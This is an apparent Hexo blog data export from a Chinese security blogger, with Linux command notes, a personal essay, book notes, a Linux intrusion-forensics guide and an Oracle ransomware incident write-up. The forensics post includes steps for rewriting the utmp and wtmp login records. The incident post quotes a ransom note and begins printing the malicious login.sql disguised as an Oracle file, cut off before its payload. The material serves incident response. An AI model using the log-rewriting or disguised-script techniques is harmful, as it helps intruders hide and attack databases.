{"meta":{"title":"凉城Lc","subtitle":"真正的不自由，是在自己的心中设下牢笼","description":"等我对自己很满意的时候，再预谋一场艳遇，岂不美哉。","author":"凉城Lc","url":"http://airs-sec.com"},"pages":[{"title":"about","date":"2018-07-09T06:21:25.000Z","updated":"2018-07-09T06:27:53.615Z","comments":true,"path":"about/index.html","permalink":"http://airs-sec.com/about/index.html","excerpt":"","text":""},{"title":"安全导航","date":"2018-07-10T02:09:36.000Z","updated":"2018-07-10T02:25:15.078Z","comments":true,"path":"安全导航/index.html","permalink":"http://airs-sec.com/安全导航/index.html","excerpt":"","text":"test"},{"title":"vuls","date":"2018-07-10T01:54:38.000Z","updated":"2018-07-10T01:54:38.126Z","comments":true,"path":"vuls/index.html","permalink":"http://airs-sec.com/vuls/index.html","excerpt":"","text":""}],"posts":[{"title":"linux就该这么学-2","slug":"linux就该这么学-2","date":"2018-07-13T14:36:15.000Z","updated":"2018-07-13T15:07:41.433Z","comments":true,"path":"2018/07/13/linux就该这么学-2/","link":"","permalink":"http://airs-sec.com/2018/07/13/linux就该这么学-2/","excerpt":"用户不能直接操作底层，通过shell可以达到控制底层。应用程序处于最上层，和用户最近的一层，应用程序和内核之间的就是系统调用接口（shell）。","text":"用户不能直接操作底层，通过shell可以达到控制底层。应用程序处于最上层，和用户最近的一层，应用程序和内核之间的就是系统调用接口（shell）。 计算机用户可以通过shell或者应用程序本身将摄入传送给linux内核，达到控制linux内核，从而驱动系统硬件进行数据处理，系统硬件将处理结果输出给用户。应用程序在功能设计上，本质上是shell的图形化，有些功能操作并没有直接操作shell来的快，所以，为什么说，有些人喜欢用命令行，而抛弃图形化界面。 现在用的最多的就是bash了，很多linux系统默认就是bash shell。 通过shell就命令传送给linux内核执行，下面开始列出些linux常用的命令。 基础命令1、echo在屏幕上打印字符或变量 12[root@Lc ~]# echo 'hello,world'hello,world 2、datedate [参数] [选项] -d ：显示字符串所指的日期和时间 -s ：根据指定字符串设置日期和时间 字符串用双引号括起来 123456789101112[root@Lc ~]# date2018年 04月 05日 星期四 00:28:57 CST[root@Lc ~]# date +%Y-%m-%d-%X2018-04-05-00时30分52秒[root@Lc ~]# date -d \"1 day ago\" +\"%Y-%m-%d\"2018-04-03#date设置时间[root@Lc ~]# date -s \"20180404 16:32\" 123456789101112131415161718192021222324%H 小时，24小时制（00~23）%I 小时，12小时制（01~12）%k 小时，24小时制（0~23）%l 小时，12小时制（1~12）%M 分钟（00~59）%p 显示出AM或PM%r 显示时间，12小时制（hh:mm:ss %p）%s 从1970年1月1日00:00:00到目前经历的秒数%S 显示秒（00~59）%T 显示时间，24小时制（hh:mm:ss）%X 显示时间的格式（%H:%M:%S）%Z 显示时区，日期域（CST）%a 星期的简称（Sun~Sat）%A 星期的全称（Sunday~Saturday）%h,%b 月的简称（Jan~Dec）%B 月的全称（January~December）%c 日期和时间（Tue Nov 20 14:12:58 2012）%d 一个月的第几天（01~31）%x,%D 日期（mm/dd/yy）%j 一年的第几天（001~366）%m 月份（01~12）%w 一个星期的第几天（0代表星期天）%W 一年的第几个星期（00~53，星期一为第一天）%y 年的最后两个数字（1999则是99） 时间同步 123456789101112[root@Lc ~]# date -s &quot;20180405 14:02:20&quot;2018年 04月 05日 星期四 14:02:20 CST[root@Lc ~]# clock -w[root@Lc ~]# date2018年 04月 05日 星期四 14:02:26 CST[root@Lc ~]# hwclock2018年04月05日 星期四 14时02分31秒 -0.063613 seconds[root@Lc ~]# clock2018年04月05日 星期四 14时02分34秒 -0.562994 seconds 一个是OS系统时间,一个是BIOS时间，用hwclock –systohc or -hctosys 用这个指令可以同步两者的时间 3、reboot 用于重启系统 4、wget 用于从网络上下载文件 wget [参数] [url链接] 5、elinks 纯文本浏览器 6、shutdown 关机 系统状态检测命令1、ifconfig 获取网卡配置或网络状态 12345678910111213141516171819202122[root@Lc ~]# ifconfigeth0 Link encap:Ethernet HWaddr 00:0C:29:B3:98:69 inet addr:192.168.63.131 Bcast:192.168.63.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:feb3:9869/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:816 errors:0 dropped:0 overruns:0 frame:0 TX packets:325 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:69372 (67.7 KiB) TX bytes:42182 (41.1 KiB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b) ``` &gt; 通过ifconfig配置的网卡信息，当前环境生效，重启后失效。 ifconfig eth[x] xxx.xxx.xxx.xxx/xx1234## 2、uname &gt; 查看系统内核版本 [root@Lc ~]# uname -aLinux Lc 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [root@Lc ~]# uname -r2.6.32-431.el6.x86_64 [root@Lc ~]# cat /etc/redhat-releaseCentOS release 6.5 (Final)1234## 3、uptime &gt; 用于查看系统负载情况 [root@Lc ~]# uptime16:41:30 up 18 min, 2 users, load average: 0.00, 0.00, 0.00系统当前时间 系统已经运行时间 当前在线用户 系统1分钟、5分钟和15分钟内平均负载情况 （负载小于1为正常）12345678910- 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。- 如果每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。- 如果你的linux主机是1个双核CPU的话，当Load Average 为6的时候说明机器已经被充分使用了。每秒钟刷新查看 witch -n 1 uptime1234567## 4、free &gt; 用于查看当前系统内存使用情况free -m : 以MB为单位显示内存使用情况 [root@Lc ~]# free -m total used free shared buffers cachedMem: 1861 268 1593 0 16 136-/+ buffers/cache: 114 1747Swap: 3999 0 399912345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394- total：内存总数- userd：当前已使用的内存数- free：空闲的内存数- shared：当前已经废弃不用- buffers：缓存内存数- cached：缓存内存数- 内存 = used + free&gt; (-buffers/cache) used内存数：Mem行中的 used – buffers – cached(+buffers/cache) free内存数: Mem行中的 free + buffers + cached可见-buffers/cache反映的是被程序实实在在吃掉的内存，而+buffers/cache反映的是可以挪用的内存总数。- swap:是指交换分区## 5、who &gt; 用于查看当前登录主机的用户情况## 6、last &gt; 用于查看所有系统的登录记录## 7、history &gt; 查看命令执行历史.bash_historyhistory -c/etc/profile - HISSIZE# 工作目录切换命令## 1、pwd &gt; 显示当前所在的工作目录## 2、cd &gt; 工作目录切换| 参数 | 作用 || --------- | ----------------------------- || - | 切换到上一次的目录，如“cd-” || ~ | 切换到家目录，如“cd ~” || ~username | 切换到其他用户的家目录 || .. | 切换到上级目录，“cd ..” |## 3、ls &gt; 查看目录下的文件# 文本编辑命令## 1、cat &gt; 查看纯文本文件-n/-b：显示行号## 2、more &gt; 查看纯文本文件## 3、head &gt; 查看文本文件的前N行，默认显示前10行，-n：指定显示的行数## 4、tail &gt; 查看文本文件的后N行## 5、od&gt; 用于查看特殊格式的文件![od][3]## 6、tr&gt; 用于转换文本文件中的字符先查看文本内容，后通过管道符将输出的文本给tr进行文本转换。 [root@Lc ~]# cat test.txtwww.airs-sec.comlinux[root@Lc ~]# cat test.txt | tr [a-z] [A-Z]WWW.AIRS-SEC.COMLINUX123456## 7、wc&gt; 用于统计指定文本的行数、字数、字节数，wc [参数] 文本 [root@Lc ~]# cat /etc/passwd | wc -l2012345678## 8、cut&gt; 用于通过列来提取文本字符，格式为：cut [参数] 文本- -d:指定分隔符- -f:指定显示的列数 [root@Lc ~]# cat /etc/passwd | cut -d “:” -f1rootbindaemonadmlpsyncshutdownhaltmailuucpoperatorgamesgopherftpnobodydbusvcsasaslauthpostfixsshd123456789101112131415161718192021222324252627## 9、diff &gt; 比较两个文本文件的内容差异```shell[root@Lc ~]# diff test.txt test1.txt1c1&lt; www.airs-sec.com---&gt; http://www.airs-sec.com2a3&gt; windows[root@Lc ~]# diff --brief test.txt test1.txtFiles test.txt and test1.txt differ[root@Lc ~]# diff -c test.txt test1.txt*** test.txt 2018-04-05 15:12:08.356992993 +0800--- test1.txt 2018-04-05 15:22:40.555994033 +0800****************** 1,2 ****! www.airs-sec.com linux--- 1,3 ----! http://www.airs-sec.com linux+ windows 文件目录管理命令1、touch 创建空白时间与修改文件时间 1234567891011121314151617[root@Lc ~]# ll总用量 32-rw-r--r--. 1 root root 0 4月 5 15:41 1.txt-rw-------. 1 root root 1206 1月 30 19:45 anaconda-ks.cfg-rw-r--r--. 1 root root 13231 1月 30 19:45 install.log-rw-r--r--. 1 root root 3482 1月 30 19:44 install.log.syslog-rw-r--r--. 1 root root 38 4月 5 15:22 test1.txt-rw-r--r--. 1 root root 23 4月 5 15:12 test.txt[root@Lc ~]# touch -d &quot;2 day ago&quot; 1.txt[root@Lc ~]# ll总用量 32-rw-r--r--. 1 root root 0 4月 3 18:03 1.txt-rw-------. 1 root root 1206 1月 30 19:45 anaconda-ks.cfg-rw-r--r--. 1 root root 13231 1月 30 19:45 install.log-rw-r--r--. 1 root root 3482 1月 30 19:44 install.log.syslog-rw-r--r--. 1 root root 38 4月 5 15:22 test1.txt-rw-r--r--. 1 root root 23 4月 5 15:12 test.txt 2、mkdir 创建目录 -m=MODE 指定目录的权限 -p：创建多层目录 123456789101112131415161718192021222324252627[root@Lc ~]# mkdir dir[root@Lc ~]# ll总用量 36-rw-r--r--. 1 root root 0 4月 3 18:03 1.txt-rw-------. 1 root root 1206 1月 30 19:45 anaconda-ks.cfgdrwxr-xr-x. 2 root root 4096 4月 5 18:15 dir-rw-r--r--. 1 root root 13231 1月 30 19:45 install.log-rw-r--r--. 1 root root 3482 1月 30 19:44 install.log.syslog-rw-r--r--. 1 root root 38 4月 5 15:22 test1.txt-rw-r--r--. 1 root root 23 4月 5 15:12 test.txt[root@Lc ~]# mkdir -m 777 dir1[root@Lc ~]# ll总用量 40-rw-r--r--. 1 root root 0 4月 3 18:03 1.txt-rw-------. 1 root root 1206 1月 30 19:45 anaconda-ks.cfgdrwxr-xr-x. 2 root root 4096 4月 5 18:15 dirdrwxrwxrwx. 2 root root 4096 4月 5 18:15 dir1-rw-r--r--. 1 root root 13231 1月 30 19:45 install.log-rw-r--r--. 1 root root 3482 1月 30 19:44 install.log.syslog-rw-r--r--. 1 root root 38 4月 5 15:22 test1.txt-rw-r--r--. 1 root root 23 4月 5 15:12 test.txt[root@Lc ~]# mkdir -p dir3/&#123;test1,test2&#125;[root@Lc ~]# ll dir3总用量 8drwxr-xr-x. 2 root root 4096 4月 5 18:16 test1drwxr-xr-x. 2 root root 4096 4月 5 18:16 test2 3、cp 复制文件或目录 cp [参数] 源文件 目标文件 -p：保留原始文件的属性 -r：递归复制 4、mv 移动文件或重命名 5、rm 删除文件或目录 -r：忽略警告 -f：删除目录 6、dd 用于复制文件并对原文件的内容进行转换和格式化处理。 参数 作用 if 输入文件的名称 of 输出文件的名称 bs 设置每个“块”的大小 count 设置要拷贝“块”的个数 案例： 生成一个100M的空白文件 12345678[root@Lc ~]# dd if=/dev/zero of=test_dd bs=100M count=1记录了1+0 的读入记录了1+0 的写出104857600字节(105 MB)已复制，1.38478 秒，75.7 MB/秒[root@Lc ~]# ll test_dd-rw-r--r--. 1 root root 104857600 4月 6 01:38 test_dd[root@Lc ~]# ll -h test_dd-rw-r--r--. 1 root root 100M 4月 6 01:38 test_dd 注： /dev/zero 是一个字符设备，会不断返回0值字节（\\0）。 用户与组管理命令1、useradd 用于创建新用户 参数 作用 -d 指定用户的家目录 -e 指定此用户的使用期限，格式：YYYY-MM-DD -g 指定一个用户组，此组必须存在 -s 指定默认的shell -u 指定用户的UID 123[root@Lc ~]# useradd -d /home/testuser -s /sbin/nologin -u 8888 test[root@Lc ~]# id testuid=8888(test) gid=8888(test) 组=8888(test) 2、passwd 设置/修改用户的密码 参数 作用 -l 锁定用户禁止登陆 -u 解除锁定，允许用户登录 –stdin 允许从标准输入修改密码 -e 强制用户下次登录时修改密码 -S 显示登录用户的密码状态 -d 使账号无密码 1234567[root@Lc ~]# passwd -S rootroot PS 2018-01-30 0 99999 7 -1 (密码已设置，使用 SHA512 加密。)# 如果未设置密码，未状态如下[root@Lc ~]# passwd -S testtest LK 2018-04-05 0 99999 7 -1 (密码已被锁定。) 3、userdel 删除用户 -f：强制删除用户，家目录及文件 -d：删除用户，家目录及文件 4、usermod 修改用户的属性 5、groupadd 创建群组 打包压缩文件命令1、tar 用于对文件打包或压缩 1.1、打包并压缩文件 tar -czvf 压缩包名.tar.gz 文件名1.2、解压并展开压缩包 tar -xzvf 压缩包名.tar.gz tar命令只是一个打包命令，本身不对文件进行压缩，进行压缩要结合zip命令。 #文件查询命令 1、grep 对文本进行搜索 2、find 用于查找文件","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"linux就该这么学-1","slug":"linux就该这么学-1","date":"2018-07-12T12:59:20.000Z","updated":"2018-07-12T13:14:19.780Z","comments":true,"path":"2018/07/12/linux就该这么学-1/","link":"","permalink":"http://airs-sec.com/2018/07/12/linux就该这么学-1/","excerpt":"本文档参考《linux就该这么学》中的知识内容与体系，看了一遍顺便做了下笔记，笔记相对简单。","text":"本文档参考《linux就该这么学》中的知识内容与体系，看了一遍顺便做了下笔记，笔记相对简单。 00 概述开源软件的特性 使用自由 修改自由 重新发布自由 创建衍生品自由 Linus Torvalds-&gt;1991.10 01 linux系统的安装 linux的安装比较简单，同时，也可以在物理计算机上安装。 windows虚拟机安装 tools vmware workstation xx redhat 7.0 hash 1.0.4 linux虚拟机安装-KVM 首先，安装kvm软件 配置ip地址 配置虚拟机参数 配置VNC服务 重置Root用户密码开机进入这个页面，按“e” 选中第二个kernel开头的一行，按“e” 在末尾加一个“single”，回车，返回上一页 按“b”重新启动，进入后直接使用“passwd”，修改root用户的密码，之后，重启即可。 软件安装 rpm redhat package manage，可以在本地配置rpm源 yum yum仓库较rpm来讲，更加方便快捷。 yum仓库的配置文件均以.repo结尾并存放在/etc/yum.repos.d/目录下。 centos6.5的yum源配置文件如下,163的源： 12345678 [base]name=CentOS-$releasever - Base - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=osgpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-6 更换清华大学的yum源-CentOS 源使用帮助 name：源的名称，可自定义 baseurl：源地址，提供方式有ftp(ftp://)，HTTP(http://)，本地(file://) gepcheck：设置此源的校验文件，1为校验，0为不校验 gpgkey：校验时的公钥地址 我就直接贴图了，-_-|。 配置yum源的另一种方式： 1yum install epel-release 如果你用的是Ubuntu和debian类的linux操作系统，那么安装软件使用apt-get命令。 之后，这些命令在之后会单独拿出来写独立的一篇。","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"突然间失落","slug":"突然间失落","date":"2018-07-10T13:15:10.000Z","updated":"2018-07-10T13:59:32.708Z","comments":true,"path":"2018/07/10/突然间失落/","link":"","permalink":"http://airs-sec.com/2018/07/10/突然间失落/","excerpt":"博客刚迁移，晚上，本打算写篇技术博客，想来想去，都不清楚写啥内容，做安全一路走来也这么久了，回想下过去，发现都是班门弄斧，学的都是些皮毛，写的很多博客，内容深度都是比较浅显，没什么比较深层次的东西，这种不精通的文章，往往发表出去也是没人看，所以总在写与不写中纠结，本来弄博客只是打算自己做下笔记，但与自己学习上比的话，往往感觉欠缺了什么。","text":"博客刚迁移，晚上，本打算写篇技术博客，想来想去，都不清楚写啥内容，做安全一路走来也这么久了，回想下过去，发现都是班门弄斧，学的都是些皮毛，写的很多博客，内容深度都是比较浅显，没什么比较深层次的东西，这种不精通的文章，往往发表出去也是没人看，所以总在写与不写中纠结，本来弄博客只是打算自己做下笔记，但与自己学习上比的话，往往感觉欠缺了什么。 以前看《读大学，究竟读什么》，里面有一句话印象特别深，“不可一业不专，不可只专一业”，现在，我感觉自己还是一业不专，在人生的兜兜转转中，已经过了这些年了，越感觉学习上力不从心了，学，学了很多，而没有精度。 比如，编程，从大学都已近开始学了，期间学了C、汇编、html、css、js、php，但已过这些年，对这些东西还不是很熟练，前端是早就不弄了，php做了一门脚本语言，且在平常的安全测试中，也是接触的比较多的，也不是很熟练，编程只要多练其实就可以提升编程能力的，也正因为没有多练，才如此不熟练。 正因为学的杂，所以学的乱。 也就在工作之后，那时还不清楚有安全这个行业，但是有网络基础，陪同学去面试了，本来之前老师的关系，去一家当地比较大的公司，但由于种种关系，刚好也去同学面试的那家公司看看，面试过来，提出的工资是比较低的，当时，咨询过老师之后，本身还在读书，可以去小公司学点技术也是可以的，在老师的劝导之后，也就入职了那家公司，也就是现在的这家公司。 想想，在这也呆了有两三年了，很多东西都是懵懵懂懂过来的，也没去计较工资的高低，但随着身边同事的不断离开，自己往往想的很多，其实，我是那种呆了一个地方就会一直待下去的那种，懒得跳来跳去，自己也是这种性格，也不清楚，是不是这种性格吃了亏，很多东西以为忍忍就过去了，在本身的不断平衡当中，继续做着有很多不顺心的事。 就像《黑客与画家》当中说的，“如果你工作的不辛苦，你可能正在浪费你的时间”，在没有挑战性的工作面前，一切工作都是像流水线一样，完成了就好了，没有激情，也没有任何有创造性的东西。 我不是大牛，只是个菜鸟。 也很想在工作中能有一个大牛带着我学习，能在技术上有个领头人，由于公司的关系，公司的没了西墙补东墙的模式，并不去容纳大牛，而招聘学校中还未毕业的实习生，很多刚来的实习生，也不是专业的安全人员，首先，得先较一些简单的测试工具怎么用，一步步去教，带人，其实是很累的，况且，学了几个月，由于各种关系，人又跑了，又来一批实习生，又得一步步教，人又跑了，在这循环当中。 很多时候，我在想，我这样做的意义何在。 没有开发能力，也不想去开发什么东西，一点琐事都搞了那么多年，还是没有弄明白。 也许，等我离开的时候，才是我成熟的时候。 但我现在还不想这样就去放弃，我觉得还是要做点什么，不管在技术、管理、个人生活方面，人生那么长，总有些不郁闷的时候，不愉快的时候，就像说了上述这么多，命运还是把握在自己手中，没有开发能力，就锻炼自己的开发能力，虽然不一定需要精通，养成一门精通已经很不错了。 接下来的岁月，放松心态，砥砺向前。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://airs-sec.com/categories/随笔/"}],"tags":[],"keywords":[{"name":"随笔","slug":"随笔","permalink":"http://airs-sec.com/categories/随笔/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-07-09T05:27:48.605Z","updated":"2018-07-09T06:56:23.246Z","comments":true,"path":"2018/07/09/hello-world/","link":"","permalink":"http://airs-sec.com/2018/07/09/hello-world/","excerpt":"换了一个主题，地址：https://gitee.com/shenweiyan/hexo-theme-BlueLake Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"换了一个主题，地址：https://gitee.com/shenweiyan/hexo-theme-BlueLake Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[],"keywords":[]},{"title":"黑客与画家-三-不能说的话","slug":"黑客与画家-三-不能说的话","date":"2018-05-13T11:27:55.000Z","updated":"2018-07-09T06:58:29.851Z","comments":true,"path":"2018/05/13/黑客与画家-三-不能说的话/","link":"","permalink":"http://airs-sec.com/2018/05/13/黑客与画家-三-不能说的话/","excerpt":"明明是专横武断、毫无依据的错误观点，但是大多数人却深信不疑，受到影响而不自知。 你是一个随大流的人吗？ 一种可能是，也许事情并没有这么巧合，你的观点就是从别人那里听来的，别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。 与历史上别的年代一样，我们的思想几乎肯定也是一张有错误的地图。 如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。","text":"明明是专横武断、毫无依据的错误观点，但是大多数人却深信不疑，受到影响而不自知。 你是一个随大流的人吗？ 一种可能是，也许事情并没有这么巧合，你的观点就是从别人那里听来的，别人告诉你什么，你就相信了什么，你把别人灌输的观点当作了自己的观点。 与历史上别的年代一样，我们的思想几乎肯定也是一张有错误的地图。 如果别人告诉你应该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。 真话 触怒他人的言论是那些可能会有人相信的言论。 异端学说 时空差异 道貌岸然 因为他们觉得孩子不应该知道成年人语言的所有内容，只需知道一部分适合儿童的词就行了。我们喜欢孩子们看上去天真无邪。 他的头脑或多或少是纯洁无瑕的，一点也不知道哪些“不能说的话”，从来没有被真实的社会生活“污染”过。 . 孩子眼里的世界是不真实的，是一个被灌输进他们头脑的假想世界。 机制 如果一个团体强大到无比自信，它根本不会在乎别人的抨击。 为什么这么做 智力越高的人，越愿意去思考那些惊世骇俗的思想观点。 做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。 训练自己去想那些不能想的事情，你获得的好处会超过所得到的想法本身。 守口如瓶 与笨蛋辩论，你也会变成笨蛋。 自由思考比畅所欲言更重要。 笑脸相迎？ 永远质疑 时间就是一种产生距离的简单方法。 如果你想要清晰地思考，就必须远离人群。 小时候，每个人都会鼓励你不断成长，变成一个心智成熟、不再耍小孩子脾气的人。但是，很少有人鼓励你继续成长，变成一个怀疑和抵制社会错误潮流的人。","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"linux取证分析","slug":"linux取证分析","date":"2018-04-20T09:16:55.000Z","updated":"2018-04-20T09:19:26.847Z","comments":true,"path":"2018/04/20/linux取证分析/","link":"","permalink":"http://airs-sec.com/2018/04/20/linux取证分析/","excerpt":"linux取证分析@(C1-linux) 如果linux系统遭到了入侵，怎样对linux进行入侵分析呢？在分析阶段，熟悉linux下工具的使用非常重要，主要包括了日志文件、异常进程排查、异常文件分析等。","text":"linux取证分析@(C1-linux) 如果linux系统遭到了入侵，怎样对linux进行入侵分析呢？在分析阶段，熟悉linux下工具的使用非常重要，主要包括了日志文件、异常进程排查、异常文件分析等。 12# w# 显示当前登录系统的所有用户 123# lastlog# 显示最近登录操作系统的所有用户，引用/var/log/lastlog二进制文件中的信息 12345# last# 列出当前和曾经登入系统的用户信息，它默认读取的是/var/log/wtmp文件的信息。# 输出的内容包括：用户名、终端位置、登录源信息、开始时间、结束时间、持续时间。#注意最后一行输出的是wtmp文件起始记录的时间。当然也可以通过last -f参数指定读取文件，可以是/var/log/btmp、/var/run/utmp 123# lastb# 查看登录失败的用户,默认读取的是/var/log/btmp中文件的信息 123# 显示当前登录用户的信息# who 二进制文件 12345/var/run/utmp：记录当前正在登录系统的用户信息，默认由who和w记录当前登录用户的信息，uptime记录系统启动时间；/var/log/wtmp：记录当前正在登录和历史登录系统的用户信息，默认由last命令查看；/var/log/btmp：记录失败的登录尝试信息，默认由lastb命令查看。 如何查看二进制文件的内容 1、xxd xdd /var/log/wtmp 2、last -f /var/log/wtmp,同样可以查看/var/log/*tmp文件中的内容 3、utmpdump(推荐) 3.1 utmpdump [options] filename 输出格式说明 1、显示会话识别符 2、PID 3、以下值： – ： 运行等级改变/重启 bw ： 启动守护进程 数字： 表示tty号 4、可为空/用户名/重启/运行级别 5、主tty/pty(伪终端) 6、远程主机名(本地登录为空，返回内核版本) 7、远程系统的IP地址(本地为0.0.0.0) 8、该记录创建的日期和时间 在/var/log/wtmp中，会话标识符为1的代表一次新的登录时间的特征，会话标识符8表示登出事件的特征。 123# 输出特定的字段# utmpdump /var/log/wtmp | grep -E &quot;\\[7].*airs&quot; | awk -v OFS=&quot;,&quot; &apos;BEGIN &#123;FS=&quot;]&quot;&#125;;&#123;print $2,$4,$7,$8&#125;&apos; | sed -e &apos;s/\\[//g&apos; -e &apos;s/\\]//g&apos; 3.2 修改utmp或wtmp等二进制文件 # utmpdump /var/log/utmp &gt; tmp_output &lt;使用文本编辑器修改 tmp_output&gt; # utmpdump -r tmp_output &gt; /var/log/utmp 查完了用户登录之后，查看流量和进程相关的情况： 流量： top iftop nethogs 安装nethogs： 123yum -y install nethogsapt-get install nethogs 上图中的PID为3248和3218的进程存在问题，直接查看进程ID号，进程相关的东西都存放在/proc/PID下。 利用strace对PID进行追踪。 strace -tt -p 3218 进程： 注意UID为0的进程 ps -ef 检查隐藏进程 12345# ps -ef | awk &apos;&#123;print &#125;&apos; | sort -n | uniq &gt;1# ls /porc |sort -n|uniq &gt;2# diff 1 2 lsof -p PID 查看该进程所有打开的文件 lsof -i 12345lsof -iCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEdhclient 2970 root 6u IPv4 25819 0t0 UDP *:bootpcudisks-da 3218 root 3u IPv4 35724 0t0 TCP localhost:42070-&gt;122.224.32.32:6009 (SYN_SENT)udisks-da 3248 root 3u IPv4 37848 0t0 TCP localhost:42072-&gt;122.224.32.32:6009 (SYN_SENT) netstat -tlunp 检查系统后门： 12345# cat /etc/crontab# ls /var/spool/cron/# cat /etc/rc.d/rc.local# ls /etc/rc.d# ls /etc/rc3.d 更多查看 strace strace命令是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然strace与专业的调试工具比如说gdb之类的是没法相比的，因为它不是一个专业的调试器。 strace具体用法 12# file ./udisks-daemon./udisks-daemon: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.4, not stripped 来自：https://www.anquanke.com/post/id/82796 是一种病毒文件，对病毒文件进行跟踪，发现连接的ip及端口。 病毒扫描 ClamAV 1、安装 123# yum install -y epel-release# yum install -y clamav 2、更新病毒库 1sudo freshclam 3、如何使用 clamav扫描使用clamavscan命令 12345扫描所有用户的主目录:clamavscan -r /home扫描根目录：clamav -r /扫描服务器上的所有文件并显示有问题的文件：clamav -r --bell -i / ClamAV官网 ClamAV_HELP 参考： 使用 utmpdump 监控 CentOS 用户登录历史 Linux用户登录记录日志和相关查看命令汇总 How To Tell If Your Linux Server Has Been Compromised https://www.cnblogs.com/kerrycode/p/4754820.html","categories":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}],"tags":[],"keywords":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}]},{"title":"记一次某医院勒索软件事件处理整理","slug":"记一次某医院勒索软件事件处理整理","date":"2018-03-01T06:35:13.000Z","updated":"2018-03-01T06:41:33.224Z","comments":true,"path":"2018/03/01/记一次某医院勒索软件事件处理整理/","link":"","permalink":"http://airs-sec.com/2018/03/01/记一次某医院勒索软件事件处理整理/","excerpt":"","text":"起因 2018年的某天，公司接到某医院的电话，医院的后台和终端机出现数据库异常报错情况。 基于这种紧急情况，公司立马出动应急人员，赶到客户现场。 到现场，初步了解情况之后，通过沟通以及对报错信息进行分析，后台报错如下（你的数据库已被SQL RUSH Team锁死 发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致) 之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive), after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.），初步判断为Ransom_RUSHQL.A勒索病毒。这种病毒针对oracle数据库，通过一定的条件触发，并最终锁死数据库，从而引发数据库宕机。 由于是生成库，所以我们最终需要做的就是处理掉病毒，对数据进行恢复。 病毒如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148---- Copyright (c) 1988, 2011, Oracle and/or its affiliates. -- All rights reserved. ---- NAME-- login.sql---- DESCRIPTION-- PL/SQL global login &quot;site profile&quot; file---- Add any PL/SQL commands here that are to be executed when a-- user starts PL/SQL, or uses the PL/SQL CONNECT command.---- USAGE-- This script is automatically run--..............此处为恶意软件混淆的官方声明,非官方声明......................-- This SQL was created by Oracle ; You should never remove/delete it!-- MODIFIED (MM/DD/YY)-- esoyleme 02/27/02 - remove xumuts.plb-- rburns 02/20/02 - re-validate catalog-- rburns 02/11/02 - add registry version-- rpang 01/25/02 - add UTL_GDK-- esoyleme 01/23/02 - bring in changes from oraolap..............此处内容过多，省略...................... -- akruglik 05/06/98 - add tabfragobj# to lobfrag$ and -- tabpartobj# to lobcomppart$-- nagarwal 05/02/98 - create indexes on operator catalogs-- akruglik 05/01/98 - add defbufpool to PARTLOB$ and LOBCOMPPART$ -- syeung 04/27/98 - remove type# from tabcompart$ and indcompart$ and-- make deflists and defgroups nullablecreate or replace procedure &quot;DBMS_SUPPORT_INTERNAL 